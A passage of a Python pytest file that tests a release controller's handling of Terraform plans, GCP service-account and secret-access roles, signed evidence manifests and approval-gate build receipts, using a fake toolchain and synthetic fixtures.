"""Functional, offline contract for the immutable release controller."""

from __future__ import annotations

import hashlib
import json
import subprocess
from pathlib import Path

import pytest

from scripts.release_controller import (
    ControllerRejected,
    E2E_SECRET_ENV_KEYS,
    GATE_SERVICE_ACCOUNT_IDS,
    GitCandidateSource,
    GCSArtifactStore,
    LocalCandidateSource,
    MemoryArtifactStore,
    PLATFORM_RUNTIME_SERVICE_ACCOUNTS,
    ProductionToolchain,
    RUNTIME_SERVICE_ACCOUNTS,
    ReleaseController,
    Toolchain,
    _runtime_secret_contract,
    _validate_environment_plan,
    _validate_platform_plan,
    build_parser,
    validate_terraform_tree,
)


def test_production_runtime_inventory_uses_a_dedicated_producer() -> None:
    assert RUNTIME_SERVICE_ACCOUNTS["production"] == (
        "ticket-producer-prod",
        "ticket-worker-prod",
        "ticket-reconciler-prod",
        "ticket-task-signer-prod",
        "ticket-scheduler-prod",
    )
    assert "kb-rag-runner" not in PLATFORM_RUNTIME_SERVICE_ACCOUNTS


@pytest.mark.parametrize(
    ("environment", "release_phase"),
    [
        ("staging", "dark_100"),
        ("staging", "full"),
        ("production", "dark_no_traffic"),
        ("production", "full"),
    ],
)
def test_forusbots_runtime_secret_is_worker_only(environment, release_phase):
    inventory, service_keys, accessor_roles = _runtime_secret_contract(
        environment, release_phase,
    )

    assert "FORUSBOTS_AUTH_TOKEN" in inventory
    assert "FORUSBOTS_AUTH_TOKEN" not in service_keys["producer"]
    assert "FORUSBOTS_AUTH_TOKEN" in service_keys["worker"]
    assert accessor_roles["FORUSBOTS_AUTH_TOKEN"] == {"worker"}


SHA = "a" * 40
EVIDENCE_SHA = "b" * 40
IMAGE = "us-central1-docker.pkg.dev/proj/repo/app@sha256:" + "c" * 64
CONTROLLER_IMAGE = "us-central1-docker.pkg.dev/proj/repo/controller@sha256:" + "d" * 64
PROJECT = "rag-kb-system"
EMPTY_SECRET_BASELINE = {
    "version": "1.5.0",
    "plugins_used": [{"name": "KeywordDetector"}],
    "filters_used": [],
    "results": {},
}
CORE_ENV = {
    key: "configured"
    for key in (
        "ENABLE_EXECUTION_LOGGING", "FORUSBOTS_BASE_URL", "GCS_BUCKET",
        "INDEX_NAME", "LLM_ROUTE_CLASSIFY", "LLM_ROUTE_DECOMPOSE",
        "LLM_ROUTE_GR_OUTCOME", "LLM_ROUTE_GR_RESPONSE", "LLM_ROUTE_KNOWLEDGE",
        "LLM_ROUTE_REQUIRED_DATA", "LLM_ROUTE_EXTRACT_INQUIRIES",
        "LLM_ROUTE_KB_QUESTION_SYNTHESIS", "LLM_ROUTE_FORUSBOTS_FIELD_MAP",
        "LLM_ROUTE_GR_BODY_BUILD", "LLM_ROUTE_TICKET_FIELD_EXTRACT",
        "LOG_LEVEL", "NAMESPACE", "OPENAI_MODEL",
        "OPENAI_REASONING_EFFORT", "TICKET_LLM_PRICING_JSON", "USE_VERTEX_AI",
    )
}
CORE_ENV.update({
    "GCS_BUCKET": "rag-kb-system-kb-articles",
    "FORUSBOTS_BASE_URL": "https://forusbots.example",
    "ENABLE_EXECUTION_LOGGING": "true",
    "USE_VERTEX_AI": "false",
    "TICKET_LLM_PRICING_JSON": (
        '{"pricing_as_of":"2026-07-21",'
        '"source":"openai-google-official-public-pricing","models":{'
        '"openai:gpt-5.5":{"input_usd_per_million":5,'
        '"output_usd_per_million":30},'
        '"gemini:gemini-2.5-pro":{"input_usd_per_million":1.25,'
        '"output_usd_per_million":10}}}'
    ),
})
for _route_key in tuple(key for key in CORE_ENV if key.startswith("LLM_ROUTE_")):
    CORE_ENV[_route_key] = "gpt-5.5"


class FakeToolchain(Toolchain):
    """Deterministic fake executable boundary; controller logic stays real."""

    def __init__(self):
        self.calls: list[tuple[str, ...]] = []
        self.e2e_registry_digest = "sha256:" + "f" * 64
        self.state_generation: str | None = "42"
        self.semantic_plan: dict = {
            "format_version": "1.2", "resource_changes": [],
        }
        self.staging_observation: dict = {}
        self.builds: dict[str, dict] = {}
        self.triggers: dict[str, dict] = {}
        self.scan_result = {"status": "passed", "critical": 0, "high": 0}

    def run(self, argv, *, cwd=None, capture=False):
        del cwd
        command = tuple(str(part) for part in argv)
        self.calls.append(command)
        if command[:3] == ("terraform", "state", "pull"):
            return json.dumps({"lineage": "lineage-1", "serial": 7})
        if command[:3] == ("terraform", "output", "-json"):
            names = (
                "ticket-producer-stg", "ticket-worker-stg",
                "ticket-reconciler-stg", "ticket-task-signer-stg",
                "ticket-scheduler-stg",
                "ticket-e2e-stg",
                "ticket-producer-prod", "ticket-worker-prod",
                "ticket-reconciler-prod",
                "ticket-task-signer-prod", "ticket-scheduler-prod",
            )
            return json.dumps({
                "runtime_service_accounts": {
                    "sensitive": False,
                    "value": {
                        name: f"{name}@{PROJECT}.iam.gserviceaccount.com"
                        for name in names
                    },
                },
                "evidence_bucket": {
                    "sensitive": False, "value": "release-evidence",
                },
                "firestore_scope_phase": {
                    "sensitive": False, "value": "enforce",
                },
                "firestore_scope_enforced": {
                    "sensitive": False, "value": True,
                },
                "pipeline_service_accounts": {
                    "sensitive": False, "value": {},
                },
                "environment_handoff_phase": {
                    "sensitive": False,
                    "value": {"staging": "disabled", "production": "disabled"},
                },
                "environment_run_resources": {
                    "sensitive": False,
                    "value": {"staging": [], "production": []},
                },
                "environment_secret_ids": {
                    "sensitive": False,
                    "value": {"staging": [], "production": []},
                },
                "environment_container_phase": {
                    "sensitive": False,
                    "value": {"staging": "disabled", "production": "disabled"},
                },
                "environment_release_phase": {
                    "sensitive": False,
                    "value": {"staging": "disabled", "production": "disabled"},
                },
            })
        if len(command) >= 2 and command[:2] == ("terraform", "plan"):
            out_arg = next(arg for arg in command if arg.startswith("-out="))
            Path(out_arg.removeprefix("-out=")).write_bytes(b"trusted-plan")
            return ""
        if command[:2] == ("terraform", "show"):
            if "-json" in command:
                return json.dumps(self.semantic_plan)
            return "Plan: 1 to add, 0 to change, 0 to destroy\n"
        if command[:3] == ("syft", "scan", "--output"):
            return json.dumps({
                "spdxVersion": "SPDX-2.3", "packages": [{"name": "runtime"}],
            })
        if command[:2] == ("scan-image", "verify"):
            return json.dumps(self.scan_result)
        if command[:2] == ("image", "describe"):
            digest = (
                command[2].split("@", 1)[1]
                if "@" in command[2] else self.e2e_registry_digest
            )
            return json.dumps({"digest": digest})
        if command[:2] == ("provenance", "verify"):
            return json.dumps({
                "provenance_verified": True,
                "source_commit": command[3],
                "subject_digest": command[2],
                "build_id": "build-123",
            })
        if command[:2] == ("detect-secrets", "scan"):
            return json.dumps(EMPTY_SECRET_BASELINE)
        return ""

    def backend_state_generation(self, bucket):
        self.calls.append(("backend-state-generation", bucket))
        return self.state_generation

    def observe_staging(self):
        self.calls.append(("observe-staging",))
        return self.staging_observation

    def describe_build(self, build_id):
        self.calls.append(("describe-build", build_id))
        return self.builds[build_id]

    def describe_trigger(self, trigger_id):
        self.calls.append(("describe-trigger", trigger_id))
        return self.triggers[trigger_id]


def _sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _signed_manifest(body: dict, hash_field: str = "manifest_hash") -> bytes:
    unsigned = json.dumps(body, sort_keys=True, separators=(",", ":")).encode()
    return json.dumps(
        {**body, hash_field: _sha256(unsigned)},
        sort_keys=True,
        separators=(",", ":"),
    ).encode()


def _gate_accounts_json() -> str:
    return json.dumps({
        key: [f"{key}@example.com"] for key in GATE_SERVICE_ACCOUNT_IDS
    }, sort_keys=True)


def _install_gate_receipts(
    tools: FakeToolchain, artifacts: MemoryArtifactStore, planned: dict,
) -> str:
    manifest = json.loads(artifacts.read(planned["plan_manifest_uri"]))
    scope = manifest["gate_scope"]
    entries = []
    for number, key in enumerate(manifest["required_gate_roles"], start=1):
        gate, role = ReleaseController._gate_role_parts(key)  # noqa: SLF001
        trigger_id = f"trigger-{number:02d}-{key}"
        build_id = f"receipt-{number:02d}-{key}"
        approver = f"approver-{number}@example.com"
        account_id = GATE_SERVICE_ACCOUNT_IDS[key]
        service_account = (
            f"projects/{PROJECT}/serviceAccounts/{account_id}@{PROJECT}."
            "iam.gserviceaccount.com"
        )
        args = [
            "gate-receipt", "--gate", gate,
            "--approver-role", role, "--approver-accounts", approver,
        ]
        trigger_step = {
            "name": CONTROLLER_IMAGE,
            "args": args,
            "env": [
                "BUILD_ID=$BUILD_ID",
                "PROJECT_ID=$PROJECT_ID",
                "COMMIT_SHA=$COMMIT_SHA",
            ],
        }
        executed_step = {
            **trigger_step,
            "env": [
                f"BUILD_ID={build_id}",
                f"PROJECT_ID={PROJECT}",
                f"COMMIT_SHA={'d' * 40}",
            ],
        }
        tools.triggers[trigger_id] = {
            "id": trigger_id,
            "name": f"handle-ticket-gate-{key}",
            "serviceAccount": service_account,
            "approvalConfig": {"approvalRequired": True},
            "sourceToBuild": {
                "uri": "https://github.com/ialvisti/ForUsGuide",
                "ref": "refs/heads/main", "repoType": "GITHUB",
            },
            "build": {"steps": [trigger_step]},
        }
        tools.builds[build_id] = {
            "id": build_id,
            "name": f"projects/{PROJECT}/locations/global/builds/{build_id}",
            "projectId": PROJECT,
            "buildTriggerId": trigger_id,
            "status": "SUCCESS",
            "serviceAccount": service_account,
            "sourceProvenance": {
                "resolvedGitSource": {"revision": "d" * 40},
            },
            "substitutions": {**scope, "TRIGGER_NAME": f"handle-ticket-gate-{key}"},
            "approval": {
                "state": "APPROVED",
                "result": {
                    "decision": "APPROVED", "approverAccount": approver,
                    "approvalTime": f"2026-07-20T00:00:0{number}Z",
                },
            },
            "steps": [executed_step],
        }
        entries.append(f"{key}={build_id}")
    return ",".join(entries)


def _install_scoped_receipts(tools: FakeToolchain, required, scope) -> str:
    entries = []
    for number, key in enumerate(required, start=1):
        gate, role = ReleaseController._gate_role_parts(key)  # noqa: SLF001
        trigger_id = f"scoped-trigger-{number:02d}-{key}"
        build_id = f"scoped-receipt-{number:02d}-{key}"
        approver = f"scoped-approver-{number}@example.com"
        account_id = GATE_SERVICE_ACCOUNT_IDS[key]
        service_account = (
            f"projects/{PROJECT}/serviceAccounts/{account_id}@{PROJECT}."
            "iam.gserviceaccount.com"
        )
        args = [
            "gate-receipt", "--gate", gate, "--approver-role", role,
            "--approver-accounts", approver,
        ]
        literal_env = [
            "BUILD_ID=$BUILD_ID", "PROJECT_ID=$PROJECT_ID",
            "COMMIT_SHA=$COMMIT_SHA",
        ]
        tools.triggers[trigger_id] = {
            "id": trigger_id, "name": f"handle-ticket-gate-{key}",
            "serviceAccount": service_account,
            "approvalConfig": {"approvalRequired": True},
            "sourceToBuild": {
                "uri": "https://github.com/ialvisti/ForUsGuide",
                "ref": "refs/heads/main", "repoType": "GITHUB",
            },
            "build": {"steps": [{
                "name": CONTROLLER_IMAGE, "args": args, "env": literal_env,
            }]},
        }
        tools.builds[build_id] = {
            "id": build_id,
            "name": f"projects/{PROJECT}/locations/global/builds/{build_id}",
            "projectId": PROJECT, "buildTriggerId": trigger_id,
            "status": "SUCCESS", "serviceAccount": service_account,
            "sourceProvenance": {"resolvedGitSource": {"revision": "d" * 40}},
            "substitutions": dict(scope),
            "approval": {"state": "APPROVED", "result": {
                "decision": "APPROVED", "approverAccount": approver,
                "approvalTime": f"2026-07-20T01:00:{number:02d}Z",
            }},
            "steps": [{"name": CONTROLLER_IMAGE, "args": args, "env": [
                f"BUILD_ID={build_id}", f"PROJECT_ID={PROJECT}",
                f"COMMIT_SHA={'d' * 40}",
            ]}],
        }
        entries.append(f"{key}={build_id}")
    return ",".join(entries)


def _write_platform_outputs(
    store: MemoryArtifactStore, *, managed: bool = True,
) -> str:
    runtime_names = (
        "ticket-producer-stg", "ticket-worker-stg",
        "ticket-reconciler-stg", "ticket-task-signer-stg",
        "ticket-scheduler-stg",
        "ticket-e2e-stg", "ticket-producer-prod", "ticket-worker-prod",
        "ticket-reconciler-prod",
        "ticket-task-signer-prod", "ticket-scheduler-prod",
    )
    body = {
        "artifact_type": "platform_outputs",
        "status": "passed",
        "project_id": PROJECT,
        "platform_candidate_sha": "d" * 40,
        "platform_state_lineage": "platform-lineage",
        "platform_state_serial": 11,
        "terraform_outputs_hash": "9" * 64,
        "outputs": {
            "runtime_service_accounts": {
                name: f"{name}@{PROJECT}.iam.gserviceaccount.com"
                for name in runtime_names
            },
            "evidence_bucket": "release-evidence",
            "firestore_scope_phase": "enforce",
            "firestore_scope_enforced": True,
            "pipeline_service_accounts": {},
            "environment_handoff_phase": {
                "staging": "bootstrap" if managed else "disabled",
                "production": "bootstrap" if managed else "disabled",
            },
            "environment_run_resources": {"staging": [], "production": []},
            "environment_secret_ids": {"staging": [], "production": []},
            "environment_container_phase": {
                "staging": "managed" if managed else "disabled",
                "production": "managed" if managed else "disabled",
            },
            "environment_release_phase": {
                "staging": "disabled", "production": "disabled",
            },
        },
    }
    return store.write(
        "gs://release-evidence/platform-outputs/test/11/outputs.json",
        _signed_manifest(body),
    )


def _write_environment_tfvars(
    store: MemoryArtifactStore, environment: str, *, active: bool = False,
) -> str:
    tfvars: dict = {
        "producer_core_env": CORE_ENV if active else {},
        "secret_version_refs": {},
        "secret_containers": {
            "enabled": False, "ids": {}, "accessor_roles": {},
        },
    }
    if active:
        runtime_secret_keys = {
            "API_KEY", "FORUSBOTS_AUTH_TOKEN",
            "OPENAI_API_KEY", "PINECONE_API_KEY",
        }
        if environment == "staging":
            runtime_secret_keys.add("TICKET_FAULT_SIGNING_SECRET")
        tfvars["secret_version_refs"] = {
            key: f"projects/{PROJECT}/secrets/{key.lower().replace('_', '-')}/versions/1"
            for key in runtime_secret_keys
        }
        worker_secret_keys = {
            "FORUSBOTS_AUTH_TOKEN", "OPENAI_API_KEY", "PINECONE_API_KEY",
        }
        if environment == "staging":
            worker_secret_keys.add("TICKET_FAULT_SIGNING_SECRET")
        producer_secret_keys = runtime_secret_keys - {"FORUSBOTS_AUTH_TOKEN"}
        tfvars["secret_containers"] = {
            "enabled": True,
            "ids": {
                key: key.lower().replace("_", "-")
                for key in runtime_secret_keys
            },
            "accessor_roles": {
                key: (
                    (["producer"] if key in producer_secret_keys else [])
                    + (["worker"] if key in worker_secret_keys else [])
                )
                for key in runtime_secret_keys
            },
    }
    if environment == "staging":
        nonsecret_env = {
            "E2E_PRINCIPAL_ID": "e2e",
            "E2E_TENANT_ID": "tenant-staging",
            "E2E_PARTICIPANT_ID": "synthetic-participant",
            "E2E_PLAN_ID": "synthetic-plan",
            "E2E_MISMATCHED_PARTICIPANT_ID": "synthetic-mismatch",
            "E2E_MISMATCHED_PLAN_ID": "synthetic-mismatch-plan",
            "E2E_COMPANY_NAME": "Synthetic Staging Company",
            "E2E_RECORD_KEEPER": "Synthetic Record Keeper",
            "E2E_PARTICIPANT_PLAN_CONTRACT_VERSION": "synthetic-v1",
            "E2E_N8N_CONTRACT_URL": "https://n8n.example.test/e2e",
            "E2E_N8N_CONTRACT_VERSION": "synthetic-v1",
            "E2E_FORUSBOTS_CONTRACT_VERSION": "synthetic-v1",
            "E2E_FORUSBOTS_LOOKUP_URL": "https://forusbots.example.test/lookup",
            "E2E_DELIVERY_CONTRACT_VERSION": "synthetic-v1",
            "E2E_DELIVERY_LOOKUP_URL": "https://delivery.example.test/lookup",
            "E2E_GCP_AUDIT_CONTRACT_URL": "https://audit.example.test/observe",
            "E2E_GCP_AUDIT_CONTRACT_VERSION": "synthetic-v1",
            "E2E_TTL_SENTINEL_REFERENCE": "synthetic-preexpired-sentinel",
            "E2E_PRODUCTION_NEGATIVE_ATTESTATION": (
                "gs://release-evidence/prod-negative.json#1"
            ),
            "E2E_PINECONE_INDEX": "synthetic-index",
            "E2E_PINECONE_NAMESPACE": "ticket-staging",
            "E2E_PINECONE_DIMENSION": "1536",
            "E2E_DIFFERENTIAL_LEGACY_URL": (
                "https://legacy.example.test/api/v1/handle-ticket"
            ),
            "E2E_DIFFERENTIAL_LEGACY_AUDIENCE": "https://legacy.example.test",
            "E2E_DIFFERENTIAL_EVIDENCE_URI": (
                f"gs://release-evidence/handle-ticket/e2e/{SHA}/differential.json"
            ),
            "E2E_MAIN_SHA": SHA,
            "E2E_EVIDENCE_URI": (
                f"gs://release-evidence/handle-ticket/e2e/{SHA}/e2e.json"
            ),
        }
        tfvars["e2e_job"] = {
            "enabled": active,
            "image_digest": (
                "us-central1-docker.pkg.dev/proj/repo/e2e@sha256:" + "e" * 64
                if active else ""
            ),
            "service_account_email": (
                f"ticket-e2e-stg@{PROJECT}.iam.gserviceaccount.com" if active else ""
            ),
            "nonsecret_env": nonsecret_env if active else {},
            "secret_version_refs": (
                {
                    key: (
                        f"projects/{PROJECT}/secrets/"
                        f"{key.lower().replace('_', '-')}/versions/1"
                    )
                    for key in E2E_SECRET_ENV_KEYS
                } if active else {}
            ),
        }
        tfvars["producer_baseline_revision"] = (
            "kb-rag-system-staging-00001-base" if active else ""
        )
        tfvars["producer_baseline_tag"] = "baseline"
        tfvars["producer_candidate_tag"] = "candidate"
        tfvars["e2e_secret_containers"] = (
            {
                key: ref.split("/secrets/", 1)[1].split("/versions/", 1)[0]
                for key, ref in tfvars["e2e_job"]["secret_version_refs"].items()
            } if active else {}
        )
    else:
        tfvars["producer_baseline_revision"] = "kb-rag-system-00048-bkc"
    body = {
        "schema_version": 1,
        "artifact_type": "environment_tfvars",
        "status": "passed",
        "project_id": PROJECT,
        "environment": environment,
        "main_sha": SHA,
        "tfvars": tfvars,
    }
    return store.write(
        f"gs://release-evidence/environment-inputs/{environment}/inputs.json",
        _signed_manifest(body),
    )


def _plan_secret_keys(
    environment: str, release_phase: str, role: str,
) -> set[str]:
    worker = {"FORUSBOTS_AUTH_TOKEN", "OPENAI_API_KEY", "PINECONE_API_KEY"}
    production = {
        "API_KEY", "OPENAI_API_KEY", "PINECONE_API_KEY",
    }
    active = release_phase in {"shadow", "knowledge_only", "full"}
    if role == "worker":
        return worker | (
            {"TICKET_FAULT_SIGNING_SECRET"}
            if environment == "staging" and active else set()
        )
    if environment == "production":
        return production
    if active:
        return production | {"TICKET_FAULT_SIGNING_SECRET"}
    return {"API_KEY", "OPENAI_API_KEY", "PINECONE_API_KEY"}


def _plan_tfvars(environment: str, release_phase: str) -> dict:
    suffix = "stg" if environment == "staging" else "prod"
    runtime_ids = (
        "ticket-producer-stg", "ticket-worker-stg", "ticket-reconciler-stg",
        "ticket-task-signer-stg", "ticket-scheduler-stg",
        "ticket-producer-prod", "ticket-worker-prod",
        "ticket-reconciler-prod", "ticket-task-signer-prod",
        "ticket-scheduler-prod",
    )
    active = release_phase in {"shadow", "knowledge_only", "full"}
    producer_keys = _plan_secret_keys(environment, release_phase, "producer")
    worker_keys = _plan_secret_keys(environment, release_phase, "worker")
    all_keys = producer_keys | worker_keys
    refs = {
        key: (
            f"projects/{PROJECT}/secrets/"
            f"{key.lower().replace('_', '-')}/versions/1"
        )
        for key in all_keys
    }
    roles = {
        key: sorted(
            ({"producer"} if key in producer_keys else set())
            | ({"worker"} if key in worker_keys else set())
        )
        for key in all_keys
    }
    tfvars = {
        "runtime_service_accounts": {
            account_id: f"{account_id}@{PROJECT}.iam.gserviceaccount.com"
            for account_id in runtime_ids
        },
        "secret_version_refs": refs,
        "secret_containers": {
            "enabled": True,
            "ids": {
                key: key.lower().replace("_", "-") for key in all_keys
            },
            "accessor_roles": roles,
        },
        "producer_ingress": "INGRESS_TRAFFIC_ALL",
        "producer_baseline_revision": (
            "kb-rag-system-staging-00001-base"
            if environment == "staging" else "kb-rag-system-00048-bkc"
        ),
        "producer_baseline_tag": "baseline",
        "producer_candidate_tag": "candidate",
        "shadow_sample_rate": 100 if release_phase == "shadow" else 0,
        "e2e_job": {"enabled": environment == "staging" and active},
    }
    # Make the principal selected by the controller explicit in this helper.
    assert tfvars["runtime_service_accounts"][f"ticket-worker-{suffix}"]
    return tfvars


def _secret_env_entry(key: str, ref: str) -> dict:
    secret, version = ref.rsplit("/versions/", 1)
    return {
        "name": key,
        "value_source": {
            "secret_key_ref": {"secret": secret, "version": version},
        },
    }


def _runtime_service_plan(
    environment: str, release_phase: str, role: str = "producer",
) -> tuple[dict, dict]:
    tfvars = _plan_tfvars(environment, release_phase)
    suffix = "stg" if environment == "staging" else "prod"
    service_names = {
        ("staging", "producer"): "kb-rag-system-staging",
        ("staging", "worker"): "kb-rag-ticket-worker-staging",
        ("production", "producer"): "kb-rag-system",
        ("production", "worker"): "kb-rag-ticket-worker",
    }
    service_accounts = {
        "producer": (
            f"ticket-producer-stg@{PROJECT}.iam.gserviceaccount.com"
            if environment == "staging"
            else f"ticket-producer-prod@{PROJECT}.iam.gserviceaccount.com"
        ),
        "worker": f"ticket-worker-{suffix}@{PROJECT}.iam.gserviceaccount.com",
    }
    modes = {
        "dark_no_traffic": "disabled", "dark_100": "disabled",
        "shadow": "shadow", "knowledge_only": "knowledge_only",
        "full": "full",
    }
    env = [
        {"name": "APP_ROLE", "value": role},
        {"name": "TICKET_HANDLER_MODE", "value": modes[release_phase]},
    ]
    if role == "producer":
        env.append({
            "name": "TICKET_SHADOW_SAMPLE_RATE",
            "value": "1" if release_phase == "shadow" else "0",
        })
    env.extend(
        _secret_env_entry(key, tfvars["secret_version_refs"][key])
        for key in sorted(_plan_secret_keys(environment, release_phase, role))
    )
    if role == "worker":
        traffic = [{
            "type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST", "percent": 100,
        }]
    elif release_phase == "dark_no_traffic":
        traffic = [
            {
                "type": "TRAFFIC_TARGET_ALLOCATION_TYPE_REVISION",
                "revision": tfvars["producer_baseline_revision"],
                "percent": 100, "tag": "baseline",
            },
            {
                "type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST",
                "percent": 0, "tag": "candidate",
            },
        ]
    elif tfvars["e2e_job"]["enabled"]:
        traffic = [
            {
                "type": "TRAFFIC_TARGET_ALLOCATION_TYPE_REVISION",
                "revision": tfvars["producer_baseline_revision"],
                "percent": 0, "tag": "baseline",
            },
            {
                "type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST",
                "percent": 100, "tag": "candidate",
            },
        ]
    else:
        traffic = [{
            "type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST",
            "percent": 100, "tag": "candidate",
        }]
    plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": (
                f"module.{environment}.google_cloud_run_v2_service.{role}[0]"
            ),
            "mode": "managed", "type": "google_cloud_run_v2_service",
            "name": role,
            "change": {"actions": ["update"], "before": None, "after": {
                "project": PROJECT,
                "name": service_names[(environment, role)],
                "ingress": (
                    "INGRESS_TRAFFIC_ALL" if role == "producer"
                    else "INGRESS_TRAFFIC_INTERNAL_ONLY"
                ),
                "template": [{
                    "service_account": service_accounts[role],
                    "containers": [{"image": IMAGE, "env": env}],
                }],
                "traffic": traffic,
            }},
        }],
    }
    return plan, tfvars


@pytest.fixture
def candidate(tmp_path):
    root = tmp_path / "candidate"
    for environment in ("platform", "staging", "production"):
        tf_root = root / "infra" / "terraform" / "live" / environment
        tf_root.mkdir(parents=True)
        (tf_root / "main.tf").write_text(
            'terraform { required_providers { google = { source = '
            '"hashicorp/google" version = ">= 5.0.0, < 6.0.0" } } }\n'
        )
        (tf_root / "backend.tf").write_text(
            'terraform { backend "gcs" { bucket = '
            f'"rag-kb-system-tfstate-{environment}-900340137010" '
            'prefix = "state" } }\n'
        )
        (tf_root / ".terraform.lock.hcl").write_text(
            'provider "registry.terraform.io/hashicorp/google" {\n'
            '  version = "5.45.2"\n  hashes = ["h1:abc"]\n}\n'
        )
    module = root / "infra" / "terraform" / "modules" / "ticket_environment"
    module.mkdir(parents=True)
    (module / "main.tf").write_text(
        'terraform { required_providers { google = { source = '
        '"hashicorp/google" version = ">= 5.0.0, < 6.0.0" } } }\n'
    )
    (module / ".terraform.lock.hcl").write_bytes(
        (root / "infra" / "terraform" / "live" / "platform" /
         ".terraform.lock.hcl").read_bytes()
    )

    kb = root / "kb-rag-system"
    for directory in ("api", "data_pipeline", "scripts", "tests/e2e"):
        path = kb / directory
        path.mkdir(parents=True)
        (path / "placeholder.py").write_text("VALUE = 1\n")
    (kb / "tests" / "fixtures.json").write_text("{}\n")
    (kb / "scripts" / "container_smoke.py").write_text("print('ok')\n")
    rag_testing = kb / "rag-testing"
    rag_testing.mkdir()
    (rag_testing / "ticket_differential.py").write_text("print('ok')\n")
    (rag_testing / "ticket_differential_thresholds.json").write_text("{}\n")
    prompts = kb / "data_pipeline" / "agent_prompts"
    prompts.mkdir(parents=True)
    (prompts / "system.md").write_text("trusted prompt\n")
    for name in (
        "Dockerfile.e2e", "requirements.lock", "requirements-dev.lock",
        "pytest.ini", "pyproject.toml",
    ):
        (kb / name).write_text("trusted\n")
    (kb / ".secrets.baseline").write_text(
        json.dumps(EMPTY_SECRET_BASELINE) + "\n"
    )
    (kb / "Dockerfile.e2e.dockerignore").write_text(
        "*\n!Dockerfile.e2e\n!requirements.lock\n!requirements-dev.lock\n"
        "!pytest.ini\n!pyproject.toml\n!api/**\n!data_pipeline/**\n"
        "!scripts/**\n!tests/**\n"
        "!rag-testing/ticket_differential.py\n"
        "!rag-testing/ticket_differential_thresholds.json\n"
    )
    return root


@pytest.fixture
def artifacts(candidate):
    store = MemoryArtifactStore()
    reply_rows = [
        {
            "case_id": "case-1", "legacy_reply_sha256": "1" * 64,
            "v2_reply_sha256": "2" * 64,
        },
        {
            "case_id": "case-2", "legacy_reply_sha256": "3" * 64,
            "v2_reply_sha256": "4" * 64,
        },
    ]
    reply_set_sha256 = _sha256(json.dumps(
        reply_rows, sort_keys=True, separators=(",", ":"),
    ).encode())
    differential_uri = (
        f"gs://release-evidence/handle-ticket/e2e/{SHA}/execution-123/"
        "differential.json#1"
    )
    results = {
        "ci_provenance": {
            "build_id": "build-123", "provenance_verified": True,
            "source_commit": SHA, "subject_digest": IMAGE,
        },
        "sbom": {
            "format": "spdx-json", "document_namespace": "https://sbom.invalid/doc",
            "subject_digest": IMAGE, "package_count": 2,
        },
        "scan": {
            "policy_passed": True, "subject_digest": IMAGE,
            "severity_counts": {"CRITICAL": 0, "HIGH": 0},
            "high_approvals": [],
        },
        "staging_revisions": {
            "release_phase": "shadow",
            "services": {"api": {
                "revision": "api-00001-abc", "image_digest": IMAGE, "ready": True,
            }},
        },
        "e2e": {
            "tests_collected": 2, "tests_passed": 2,
            "tests_failed": 0, "tests_skipped": 0,
        },
        "differential": {
            "cases": 2, "passed": True, "failures": [],
            "semantic_quality_verified": False,
            "semantic_evaluator": {
                "method": "reviewed-lexical-rubric-v1",
                "rubric_set_sha256": "7" * 64,
            },
            "reply_set_sha256": reply_set_sha256,
            "per_case": reply_rows,
            "metrics": {
                "unsafe_publish_rate": 0.0, "missing_inquiry_rate": 0.0,
                "idempotency_replay_failure_rate": 0.0,
                "unexplained_poll_404_rate": 0.0,
                "idempotency_replay_observation_rate": 1.0,
                "deterministic_exact_match_rate": 1.0,
                "reviewed_lexical_coverage_min": 0.95,
            },
        },
        "semantic_review": {
            "semantic_quality_verified": True, "verdict": "pass",
            "review_type": "independent",
            "reviewer_identity_sha256": "6" * 64,
            "reviewed_at": "2026-07-20T12:00:00Z",
            "reviewed_case_count": 2,
            "rubric_set_sha256": "7" * 64,
            "reply_set_sha256": reply_set_sha256,
            "differential_uri": differential_uri,
        },
        "rollback": {
            "exercise": "staging rollback", "rollback_succeeded": True,
            "candidate_image_digest": IMAGE, "candidate_traffic_percent": 0,
            "restored_revision": "api-00000-safe",
            "restored_image_digest": (
                "us-central1-docker.pkg.dev/proj/repo/app@sha256:" + "4" * 64
            ),
            "poll_preserved": True,
        },
    }
    inputs = {}
    for name in (
        "ci_provenance", "sbom", "scan", "staging_revisions", "e2e",
        "differential", "semantic_review", "rollback",
    ):
        body = json.dumps({
            "schema_version": "1.0",
            "artifact_type": name,
            "status": "pass",
            "main_sha": SHA,
            "image_digest": IMAGE,
            "result": results[name],
        }, sort_keys=True).encode()
        if name in {"e2e", "differential"}:
            object_uri = (
                f"gs://release-evidence/handle-ticket/e2e/{SHA}/execution-123/{name}.json"
            )
        else:
            object_uri = f"gs://release-evidence/evidence-inputs/{name}.json"
        inputs[name] = store.write(object_uri, body)
    evidence_dir = candidate / "docs" / "verification" / "handle-ticket"
    evidence_dir.mkdir(parents=True)
    (evidence_dir / "evidence-inputs.json").write_text(json.dumps(inputs))
    (evidence_dir / "approvals.md").write_text(
        "| Gate | Texto exacto | Usuario | Rol | Fecha | Alcance | Evidencia |\n"
        "|---|---|---|---|---|---|---|\n"
        "| G2 | APROBADO G2 exacto | owner | gcp-owner | now | staging | uri |\n"
        "| G4 | APROBADO G4 exacto | owner | owner | now | e2e | uri |\n"
        "| G5 | APROBADO G5 exacto | owner | maintainer | now | merge | uri |\n"
    )
    return store


@pytest.fixture
def controller(tmp_path, candidate, artifacts):
    source = LocalCandidateSource(
        candidate,
        changed={EVIDENCE_SHA: [
            "docs/verification/handle-ticket/evidence-inputs.json",
            "docs/verification/handle-ticket/approvals.md",
        ]},
    )
    tools = FakeToolchain()
    trusted = tmp_path / "trusted"
    trusted.mkdir()
    kb = candidate / "kb-rag-system"
    for source_name, trusted_name in (
        ("requirements.lock", "requirements.lock"),
        ("requirements-dev.lock", "requirements-dev.lock"),
        (".secrets.baseline", "reviewed.secrets.baseline"),
    ):
        (trusted / trusted_name).write_bytes((kb / source_name).read_bytes())
    (trusted / "reviewed.terraform.lock.hcl").write_bytes(
        (
            candidate / "infra" / "terraform" / "live" / "platform" /
            ".terraform.lock.hcl"
        ).read_bytes()
    )
    (trusted / "container_smoke.py").write_bytes(
        (kb / "scripts" / "container_smoke.py").read_bytes()
    )
    (trusted / "verify_secrets_baseline.py").write_text("trusted verifier\n")
    for name in (
        "Dockerfile.runtime", "Dockerfile.runtime.dockerignore",
